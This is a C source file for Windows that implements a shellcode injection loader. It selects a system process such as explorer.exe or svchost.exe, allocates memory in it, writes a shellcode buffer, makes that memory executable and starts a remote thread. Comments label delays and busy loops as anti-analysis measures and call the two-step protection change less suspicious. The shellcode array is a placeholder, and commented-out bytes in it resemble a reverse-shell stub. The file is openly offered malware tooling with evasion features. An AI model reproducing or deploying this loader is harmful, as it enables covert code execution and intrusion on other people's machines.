#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

unsigned char shellcode[] = {
    // write your shellcode here
    /* Example shellcode: This is a placeholder for actual shellcode.
       Replace this with your own shellcode as needed.
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
    0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52,
    0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,
    0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41,
    0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
    0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40,
    0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
    0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c,
    0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a,
    0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b,
    0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33,
    0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00,
    0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0x0a, 0x00, 0x02, 0x0f,
    0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07,
    0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29,
    0x80, 0x6b, 0x00, 0xff, 0xd5, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48
, 0x89, 0xe6, 0x48, 0x83, 0xc4, 0x28, 0x41, 0x58, 0x41, 0x58,*/
};

// Struct for dynamically loading API functions
typedef struct {
    LPVOID pVirtualAlloc;
    LPVOID pCreateThread;
    LPVOID pWaitForSingleObject;
    LPVOID pVirtualProtect;
} DYNAMIC_API;

// Function to automatically select target process
DWORD FindTargetProcess() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD targetPID = 0;
    const char* targetProcesses[] = {"explorer.exe", "svchost.exe", "RuntimeBroker.exe"};
    int numProcesses = sizeof(targetProcesses) / sizeof(targetProcesses[0]);

    // Anti-analysis: Add a short delay
    Sleep(1000);

    // Take a snapshot of system processes
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return 0;
    }

    // Search for target processes
    do {
        for (int i = 0; i < numProcesses; i++) {
            if (_stricmp(pe32.szExeFile, targetProcesses[i]) == 0) {
                targetPID = pe32.th32ProcessID;
                CloseHandle(hProcessSnap);
                return targetPID;
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return 0;
}

// Dynamically load API functions
BOOL LoadDynamicApis(DYNAMIC_API *pApis) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        return FALSE;
    }
    
    // Anti-analysis: Add a short delay
    Sleep(500);

    pApis->pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAllocEx");
    pApis->pCreateThread = GetProcAddress(hKernel32, "CreateRemoteThread");
    pApis->pWaitForSingleObject = GetProcAddress(hKernel32, "WaitForSingleObject");
    pApis->pVirtualProtect = GetProcAddress(hKernel32, "VirtualProtectEx");

    return (pApis->pVirtualAlloc != NULL && 
            pApis->pCreateThread != NULL && 
            pApis->pWaitForSingleObject != NULL &&
            pApis->pVirtualProtect != NULL);
}

int main() {
    HANDLE processHandle;
    LPVOID remoteBuffer;
    SIZE_T shellcodeSize = sizeof(shellcode);
    DWORD targetPID;
    DWORD oldProtect;
    DYNAMIC_API apis;
    
    // Anti-analysis: Memory pollution check
    int counter = 0;
    for (int i = 0; i < 10000; i++) {
        counter += i % 3;
    }
    
    // Dynamically load API functions
    if (!LoadDynamicApis(&apis)) {
        return -1;
    }
    
    // Anti-analysis: Add a short delay
    Sleep(800);
    
    // Automatically select target process
    targetPID = FindTargetProcess();
    if (targetPID == 0) {
        return -1;
    }

    // Get access to the target process
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (processHandle == NULL) {
        return -1;
    }

    // Allocate memory in target process
    remoteBuffer = ((LPVOID (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))
                  apis.pVirtualAlloc)(processHandle, NULL, shellcodeSize, 
                                    MEM_COMMIT | MEM_RESERVE, 
                                    PAGE_READWRITE);
    
    if (remoteBuffer == NULL) {
        CloseHandle(processHandle);
        return -1;
    }

    // Write shellcode to target process
    if (!WriteProcessMemory(processHandle, remoteBuffer, shellcode, 
                          shellcodeSize, NULL)) {
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return -1;
    }
    
    // Change memory protection settings (done in two steps to appear less suspicious)
    if (!((BOOL (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD))
          apis.pVirtualProtect)(processHandle, remoteBuffer, shellcodeSize, 
                              PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return -1;
    }
    
    // Anti-analysis: Add a final delay
    Sleep(500);

    // Execute shellcode
    HANDLE remoteThread = ((HANDLE (WINAPI *)(HANDLE, LPSECURITY_ATTRIBUTES, 
                                            SIZE_T, LPTHREAD_START_ROUTINE, 
                                            LPVOID, DWORD, LPDWORD))
                         apis.pCreateThread)(processHandle, NULL, 0, 
                                          (LPTHREAD_START_ROUTINE)remoteBuffer, 
                                          NULL, 0, NULL);
    
    if (remoteThread == NULL) {
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return -1;
    }

    // Wait for thread to finish
    ((DWORD (WINAPI *)(HANDLE, DWORD))
     apis.pWaitForSingleObject)(remoteThread, INFINITE);

    // Cleanup
    CloseHandle(remoteThread);
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(processHandle);
    
    return 0;
} 